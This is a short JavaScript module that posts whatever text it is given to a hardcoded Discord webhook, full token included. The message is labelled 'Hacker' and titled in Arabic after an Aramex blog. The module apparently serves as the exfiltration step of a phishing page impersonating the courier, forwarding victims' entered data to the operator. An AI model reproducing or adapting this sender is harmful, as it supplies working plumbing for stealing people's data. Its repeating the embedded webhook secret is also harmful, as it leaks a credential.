import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330980624114126948/Rjidve4d1ss0L56DD369oPlMceIw091pKNlEC_ogcQNdWb71btp5EaOoQSihvG8E9sZ_",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
